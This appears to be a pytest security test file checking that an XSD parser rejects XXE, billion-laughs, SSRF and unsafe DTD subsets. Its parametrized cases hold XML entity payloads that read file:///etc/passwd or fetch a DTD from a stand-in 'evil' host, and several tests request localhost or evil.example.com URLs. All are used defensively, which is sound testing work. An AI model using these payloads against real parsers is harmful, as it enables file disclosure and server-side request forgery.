"""Security tests: XXE, Billion-Laughs, SSRF must all be rejected."""

from __future__ import annotations

from unittest.mock import patch

import pytest

from app import config as config_module
from app.parser.security import (
    SecurityError,
    fetch_schema_url,
    parse_bytes,
)
from app.parser.xsd_parser import parse_single


class TestXxeProtection:
    def test_dtd_with_external_entity_rejected(self, xxe_attack_bytes: bytes) -> None:
        with pytest.raises(SecurityError):
            parse_bytes(xxe_attack_bytes, "xxe.xsd")

    def test_parser_top_level_wrapper_rejects_dtd(self, xxe_attack_bytes: bytes) -> None:
        with pytest.raises(ValueError, match="DTD"):
            parse_single(xxe_attack_bytes, "xxe.xsd")


class TestBillionLaughs:
    def test_billion_laughs_rejected(self, billion_laughs_bytes: bytes) -> None:
        with pytest.raises(SecurityError):
            parse_bytes(billion_laughs_bytes, "bomb.xsd")


class TestSsrfProtection:
    def test_arbitrary_host_allowed_when_allowlist_empty(self) -> None:
        # Default behaviour: no ALLOWED_SCHEMA_HOSTS set means *any* public
        # host is permitted; only the SSRF/private-IP/scheme checks gate it.
        # We use a host that resolves to a private IP so the request never
        # actually leaves the test machine — the assertion proves the
        # allowlist gate no longer blocks unknown hosts.
        with patch.object(config_module.settings, "allowed_schema_hosts", ()):
            from app.parser import security as sec_module

            sec_module.settings = config_module.settings
            # localhost resolves to 127.0.0.1 → SSRF guard fires, not the
            # allowlist guard. The previous error wording would be
            # "not on ALLOWED_SCHEMA_HOSTS"; the new error is private/loopback.
            with pytest.raises(SecurityError, match="private/loopback"):
                fetch_schema_url("http://localhost/secret")

    def test_lockdown_allowlist_blocks_unlisted_host(self) -> None:
        import re as re_module

        with patch.object(
            config_module.settings,
            "allowed_schema_hosts",
            (re_module.compile(r"^trusted\.example\.com$"),),
        ):
            from app.parser import security as sec_module

            sec_module.settings = config_module.settings
            with pytest.raises(SecurityError, match="lockdown whitelist"):
                fetch_schema_url("http://evil.example.com/attack.xsd")

    def test_loopback_address_rejected_even_when_allowlisted(self) -> None:
        import re as re_module

        with patch.object(
            config_module.settings,
            "allowed_schema_hosts",
            (re_module.compile(r"localhost"),),
        ):
            from app.parser import security as sec_module

            sec_module.settings = config_module.settings
            with pytest.raises(SecurityError, match="private/loopback"):
                fetch_schema_url("http://localhost/secret")

    def test_non_http_scheme_rejected(self) -> None:
        with patch.object(config_module.settings, "allowed_schema_hosts", ()):
            from app.parser import security as sec_module

            sec_module.settings = config_module.settings
            with pytest.raises(SecurityError, match="only http"):
                fetch_schema_url("file:///etc/passwd")


class TestInternalDtdSubset:
    """A bounded internal subset of literal entities is allowed (W3C xmldsig)."""

    XS = b'<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" targetNamespace="&a;"/>'

    def test_w3c_xmldsig_schema_loads(self, xmldsig_bytes: bytes) -> None:
        model = parse_single(xmldsig_bytes, "xmldsig-core-schema.xsd")
        assert model.target_namespace == "http://www.w3.org/2000/09/xmldsig#"
        assert any(e.name == "Signature" for e in model.elements)

    def test_literal_entity_expanded(self) -> None:
        data = b'<!DOCTYPE schema [<!ENTITY a "urn:x">]>' + self.XS
        tree = parse_bytes(data, "s.xsd")
        assert tree.getroot().get("targetNamespace") == "urn:x"

    def test_external_dtd_is_never_loaded(self) -> None:
        data = b'<!DOCTYPE schema SYSTEM "file:///etc/passwd" [<!ENTITY a "urn:x">]>' + self.XS
        assert parse_bytes(data, "s.xsd").getroot().get("targetNamespace") == "urn:x"

    @pytest.mark.parametrize(
        "subset",
        [
            b'<!ENTITY a SYSTEM "file:///etc/passwd">',
            b'<!ENTITY % p SYSTEM "http://evil/x.dtd"> %p;',
            b'<!ENTITY a "&b;"><!ENTITY b "x">',
            b'<!ENTITY a "<xs:element/>">',
            b"<!ELEMENT a ANY>",
            b"<!NOTATION n SYSTEM 'x'>",
            b'<!ENTITY a "' + b"x" * 600 + b'">',
            b"".join(b'<!ENTITY e%d "v">' % i for i in range(33)),
        ],
    )
    def test_unsafe_subsets_rejected(self, subset: bytes) -> None:
        with pytest.raises(SecurityError, match="DTD"):
            parse_bytes(b"<!DOCTYPE schema [" + subset + b"]>" + self.XS, "s.xsd")

    def test_entity_declaration_outside_doctype_rejected(self) -> None:
        with pytest.raises(SecurityError):
            parse_bytes(self.XS + b'<!ENTITY a "x">', "s.xsd")
